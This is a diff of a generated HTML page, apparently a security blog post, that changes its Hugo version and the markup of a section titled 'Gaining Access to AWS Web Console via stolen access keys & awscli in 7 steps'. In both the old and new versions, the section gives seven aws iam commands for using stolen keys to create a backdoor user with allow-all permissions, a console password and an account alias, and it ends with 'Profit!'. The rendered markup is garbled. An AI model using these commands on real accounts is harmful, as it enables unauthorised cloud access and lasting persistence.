@@ -39,7 +39,7 @@
 
     
 
-    <meta name="generator" content="Hugo 0.54.0" />
+    <meta name="generator" content="Hugo 0.57.2" />
   </head>
 
   <body class=" ">
@@ -164,31 +164,19 @@
 <h3 id="gaining-access-to-aws-web-console-via-stolen-access-keys-awscli-in-7-steps">Gaining Access to AWS Web Console via stolen access keys &amp; awscli in 7 steps</h3>
 
 <p>Step 1) Create a temp user</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-aws iam create-user --user-name haxuser```" data-lang="aws iam create-user --user-name haxuser```">Step 2) Create access key for new temp user (can skip this step but its a cool backdoor)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-aws iam create-user --user-name haxuser```" data-lang="aws iam create-user --user-name haxuser```">Step 2) Create access key for new temp user (can skip this step but its a cool backdoor)</code></pre></div>
+<p>aws iam create-access-key &ndash;user-name haxuser```</p>
 
-```aws iam create-access-key --user-name haxuser```
+<p>Step 3) Create a new temp group for new temp user</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-aws iam create-group --group-name haxuser```" data-lang="aws iam create-group --group-name haxuser```">Step 4) Assign group policy for temp group granting all access</code></pre></div>
+<p>aws iam put-group-policy &ndash;group-name haxuser &ndash;policy-name haxuser &ndash;policy-document &lsquo;{&ldquo;Version&rdquo;:&ldquo;2012-10-17&rdquo;, &ldquo;Statement&rdquo;: [{&ldquo;Sid&rdquo;: &ldquo;Stmt1437414476731&rdquo;, &ldquo;Action&rdquo;: &ldquo;<em>&rdquo;, &ldquo;Effect&rdquo;: &ldquo;Allow&rdquo;, &ldquo;Resource&rdquo;: &ldquo;</em>&rdquo; }]}&rsquo;```</p>
 
-Step 3) Create a new temp group for new temp user
+<p>Step 5) Add temp user to temp group</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-aws iam add-user-to-group --group-name haxuser --user-name haxuser```" data-lang="aws iam add-user-to-group --group-name haxuser --user-name haxuser```">Step 6) Create a login profile for temp user with a SUPER COOL password</code></pre></div>
+<p>aws iam create-login-profile &ndash;user-name haxuser &ndash;password &lsquo;SuperDuperCoolPassword&rsquo;```</p>
 
-```aws iam create-group --group-name haxuser```
-
-Step 4) Assign group policy for temp group granting all access
-
-```aws iam put-group-policy --group-name haxuser --policy-name haxuser --policy-document &#39;{&#34;Version&#34;:&#34;2012-10-17&#34;, &#34;Statement&#34;: [{&#34;Sid&#34;: &#34;Stmt1437414476731&#34;, &#34;Action&#34;: &#34;*&#34;, &#34;Effect&#34;: &#34;Allow&#34;, &#34;Resource&#34;: &#34;*&#34; }]}&#39;```
-
-Step 5) Add temp user to temp group
-
-```aws iam add-user-to-group --group-name haxuser --user-name haxuser```
-
-Step 6) Create a login profile for temp user with a SUPER COOL password
-
-```aws iam create-login-profile --user-name haxuser --password &#39;SuperDuperCoolPassword&#39;```
-
-Step 7) Create an account alias so you can access the account web console
-
-```aws iam create-account-alias --account-alias haxuseralias```
-
-Now you can login directly using the new alias! Browse: hxxps://haxuseralias.signin.aws.amazon.com/console/
+<p>Step 7) Create an account alias so you can access the account web console</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-aws iam create-account-alias --account-alias haxuseralias```" data-lang="aws iam create-account-alias --account-alias haxuseralias```">Now you can login directly using the new alias! Browse: hxxps://haxuseralias.signin.aws.amazon.com/console/
 
 Profit!
 
